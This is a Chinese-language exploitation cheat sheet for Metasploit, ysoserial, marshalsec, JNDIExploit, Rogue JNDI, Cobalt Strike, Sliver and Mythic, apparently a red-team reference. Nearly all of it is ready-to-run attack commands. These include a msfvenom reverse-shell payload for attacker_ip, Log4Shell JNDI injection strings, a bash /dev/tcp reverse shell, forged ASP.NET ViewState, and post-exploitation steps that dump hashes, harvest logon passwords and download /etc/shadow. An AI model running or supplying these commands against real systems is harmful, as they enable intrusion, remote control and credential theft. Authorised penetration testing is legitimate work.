# 漏洞利用

_11 条工具命令_

### Metasploit  `metasploit`
_渗透测试框架_

**Step 0**
> 启动Metasploit控制台
_platform: linux_
```
msfconsole
```

**Step 0**
> 搜索相关漏洞模块
_platform: linux_
```
search exploit apache
```
**语法解析：**
- `search` — 搜索命令 _command_
- `exploit` — 模块类型 _value_
- `apache` — 搜索关键词 _value_

**Step 0**
> 选择要使用的模块
_platform: linux_
```
use exploit/multi/handler
```
**语法解析：**
- `use` — 使用模块命令 _command_
- `exploit/multi/handler` — 模块路径 _value_

**Step 0**
> 显示模块配置选项
_platform: linux_
```
show options
```
**语法解析：**
- `show` — 显示命令 _command_
- `options` — 配置选项 _value_

**Step 0**
> 设置模块参数
_platform: linux_
```
set RHOSTS 192.168.1.100
```
**语法解析：**
- `set` — 设置参数命令 _command_
- `RHOSTS` — 目标主机参数 _parameter_

**Step 0**
> 设置攻击载荷
_platform: linux_
```
set PAYLOAD windows/meterpreter/reverse_tcp
```
**语法解析：**
- `PAYLOAD` — 载荷参数 _parameter_
- `windows/meterpreter/reverse_tcp` — 反向TCP连接的Meterpreter载荷 _value_

**Step 0**
> 执行攻击
_platform: linux_
```
exploit
```
**语法解析：**
- `exploit` — 执行攻击命令 _command_

**Step 0**
> 在后台执行攻击
_platform: linux_
```
exploit -j
```
**语法解析：**
- `-j` — 后台任务模式 _parameter_

**Step 0**
> 使用msfvenom生成恶意文件
_platform: linux_
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f exe -o payload.exe
```
**语法解析：**
- `msfvenom` — MSF载荷生成工具 _command_
- `-p` — 指定载荷 _parameter_
- `-f exe` — 输出格式 _parameter_
- `-o` — 输出文件 _parameter_

**Step 0**
> Meterpreter会话中的常用命令
_platform: linux_
```
sysinfo
getuid
hashdump
```

---

### Searchsploit  `searchsploit`
_Exploit-DB本地搜索工具，离线查找漏洞利用代码_

**Step 0**
> 按关键词搜索漏洞利用
```
searchsploit apache 2.4
searchsploit wordpress 5.0
```
**语法解析：**
- `searchsploit` — Exploit-DB本地搜索工具 _command_

**Step 0**
> 精确匹配和排除关键词
```
searchsploit -e "Apache Tomcat"
searchsploit --exclude="dos" windows smb
```

**Step 0**
> 复制exploit到当前目录或显示路径
```
searchsploit -m 44228
searchsploit -p 44228
```

**Step 0**
> JSON格式输出便于脚本处理
```
searchsploit -j apache | jq ".RESULTS_EXPLOIT[]"
```

---

### ExploitDB  `exploitdb`
_漏洞利用代码数据库在线搜索_

**Step 0**
> 在线搜索漏洞利用代码
```
# 访问 https://www.exploit-db.com
# 搜索框输入: Apache Struts
# 或使用Google Dork:
site:exploit-db.com "Apache Struts" RCE
```

**Step 0**
> 通过API搜索(需要合适的请求头)
```
curl "https://www.exploit-db.com/search?q=wordpress+5.0" -H "X-Requested-With: XMLHttpRequest"
```

**Step 0**
> 使用ExploitDB的Google Hacking数据库
```
# ExploitDB收录的Google Dorks:
https://www.exploit-db.com/google-hacking-database
# 搜索泄露的配置文件、数据库等
```

---

### ysoserial  `ysoserial`
_Java反序列化漏洞利用Payload生成工具_

**Step 0**
> 使用指定Gadget Chain生成反序列化Payload
```
java -jar ysoserial.jar CommonsCollections1 "id" | base64
java -jar ysoserial.jar CommonsCollections5 "whoami" > payload.bin
```
**语法解析：**
- `CommonsCollections1` — Gadget Chain名称(依赖目标classpath) _parameter_
- `"id"` — 要执行的系统命令 _value_

**Step 0**
> 列出所有可用的Gadget Chain
```
java -jar ysoserial.jar --help
# 常用: CommonsCollections1-7, Jdk7u21, URLDNS, JRMPClient
```

**Step 0**
> 通过JRMP协议进行远程利用
```
# 监听端(攻击机):
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 "bash -c {echo,base64_cmd}|{base64,-d}|{bash,-i}"

# 发送JRMP客户端Payload:
java -jar ysoserial.jar JRMPClient attacker_ip:1099 > jrmp.bin
```

**Step 0**
> 使用URLDNS链探测反序列化漏洞(无需依赖)
```
java -jar ysoserial.jar URLDNS "http://your_dnslog.com/test" | base64
```

---

### ysoserial.net  `ysoserial-net`
_.NET反序列化Payload生成工具_

**Step 0**
> 生成.NET反序列化Payload
_platform: windows_
```
ysoserial.exe -g TypeConfuseDelegate -f ObjectStateFormatter -c "calc" -o base64
```
**语法解析：**
- `-g` — Gadget Chain名称 _parameter_
- `-f` — 序列化格式(BinaryFormatter/ObjectStateFormatter等) _parameter_
- `-c` — 要执行的命令 _parameter_
- `-o base64` — Base64编码输出 _parameter_

**Step 0**
> 伪造ASP.NET ViewState执行命令
_platform: windows_
```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c whoami" --validationalg=SHA1 --validationkey=MACHINE_KEY --generator=GENERATOR
```

**Step 0**
> 列出所有可用的Gadget Chain和格式
_platform: windows_
```
ysoserial.exe -l
# 常用: TextFormattingRunProperties, TypeConfuseDelegate, PSObject
```

---

### Marshalsec  `marshalsec`
_Java反序列化利用工具，支持多种Marshal格式和JNDI注入_

**Step 0**
> 启动恶意LDAP服务器用于JNDI注入(Log4Shell等)
```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://attacker_ip:8888/#Exploit" 1389
```
**语法解析：**
- `LDAPRefServer` — 启动LDAP Reference服务器 _command_
- `"http://attacker_ip:8888/#Exploit"` — 恶意class文件托管URL _value_
- `1389` — LDAP服务监听端口 _value_

**Step 0**
> 启动恶意RMI服务器
```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://attacker_ip:8888/#Exploit" 1099
```

**Step 0**
> 配合Log4j2 RCE完整利用链
```
# 1. 编译恶意class: javac Exploit.java
# 2. 托管class: python3 -m http.server 8888
# 3. 启动LDAP: java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://ip:8888/#Exploit" 1389
# 4. 触发: ${jndi:ldap://ip:1389/Exploit}
```

---

### JNDIExploit  `jndi-exploit`
_JNDI注入利用工具，集成多种Gadget和Bypass_

**Step 0**
> 启动JNDI Exploit服务(同时监听LDAP 1389和HTTP 3456)
```
java -jar JNDIExploit.jar -i attacker_ip
```
**语法解析：**
- `-i` — 攻击机IP地址 _parameter_

**Step 0**
> 通过不同路由执行命令或反弹Shell
```
# 触发Payload:
${jndi:ldap://attacker_ip:1389/Basic/Command/Base64/Y21k}
${jndi:ldap://attacker_ip:1389/Basic/ReverseShell/attacker_ip/4444}
```

**Step 0**
> 绕过高版本JDK的trustURLCodebase限制
```
# 使用Tomcat Bypass:
${jndi:ldap://attacker_ip:1389/TomcatBypass/Command/Base64/d2hvYW1p}
# 使用反序列化Bypass:
${jndi:ldap://attacker_ip:1389/Deserialization/CommonsCollections5/Command/Base64/d2hvYW1p}
```

---

### Rogue JNDI  `rogue-jndi`
_恶意JNDI服务器，提供多种攻击向量_

**Step 0**
> 启动恶意JNDI服务(LDAP+RMI+HTTP)
```
java -jar RogueJndi.jar --command "whoami" --hostname attacker_ip
```

**Step 0**
> 配置反弹Shell命令
```
java -jar RogueJndi.jar --command "bash -i >& /dev/tcp/attacker_ip/4444 0>&1" --hostname attacker_ip
```

**Step 0**
> 在目标注入JNDI Lookup触发利用
```
# LDAP: ${jndi:ldap://attacker_ip:1389/o=reference}
# RMI: ${jndi:rmi://attacker_ip:1099/o=reference}
```

---

### Cobalt Strike  `cobalt-strike`
_商业化红队C2框架，支持多种攻击和后渗透功能_

**Step 0**
> 启动CS服务端
_platform: linux_
```
./teamserver your_ip your_password malleable_c2_profile.profile
```

**Step 0**
> 通过图形界面生成各类Payload
```
# GUI操作:
# Attacks > Packages > Windows Executable (S)
# Attacks > Packages > HTML Application
# Attacks > Web Drive-by > Scripted Web Delivery
```

**Step 0**
> 获取Beacon后的常用后渗透命令
_platform: windows_
```
# 基础信息
whoami
shell ipconfig
getuid

# 横向移动
jump psexec target_ip SMB_listener
jump winrm target_ip HTTP_listener

# 凭证获取
hashdump
logonpasswords

# 持久化
persist-service
persist-registry
```

**Step 0**
> 使用Malleable C2 Profile伪装通信流量
_platform: linux_
```
# 使用C2 Profile伪装流量:
# https://github.com/rsmudge/Malleable-C2-Profiles
./teamserver ip pass jquery-c2.4.0.profile
```

---

### Sliver  `sliver`
_开源跨平台红队C2框架，Cobalt Strike替代品_

**Step 0**
> 启动Sliver服务端
_platform: linux_
```
sliver-server
```

**Step 0**
> 生成各平台的植入体
```
# 在Sliver控制台:
generate --mtls attacker_ip --os windows --arch amd64 --save implant.exe
generate --http attacker_ip --os linux --format shared --save implant.so
```

**Step 0**
> 启动mTLS/HTTPS/WireGuard监听器
```
mtls -l 8888
https -l 443 -d example.com
wg -l 51820
```

**Step 0**
> 常用后渗透操作命令
```
# 获取Session后:
info
getuid
ps
download /etc/shadow
upload local_file /tmp/remote
execute -o whoami
pivots tcp --bind 0.0.0.0:9050
```

---

### Mythic  `mythic`
_模块化C2框架，支持多种Agent和自定义扩展_

**Step 0**
> 安装Apollo(Windows)或Poseidon(Linux) Agent
_platform: linux_
```
sudo ./mythic-cli install github https://github.com/MythicAgents/Apollo
sudo ./mythic-cli install github https://github.com/MythicAgents/Poseidon
```

**Step 0**
> 通过Web界面管理C2操作
```
https://attacker_ip:7443
# 默认账号: mythic_admin
# 密码查看: cat .env | grep MYTHIC_ADMIN_PASSWORD
```

**Step 0**
> 通过图形界面配置和生成Payload
```
# 在Web界面:
# 1. 创建Payload Profile
# 2. 选择Agent类型(Apollo/Poseidon等)
# 3. 配置C2 Profile
# 4. 生成Payload下载
```

---
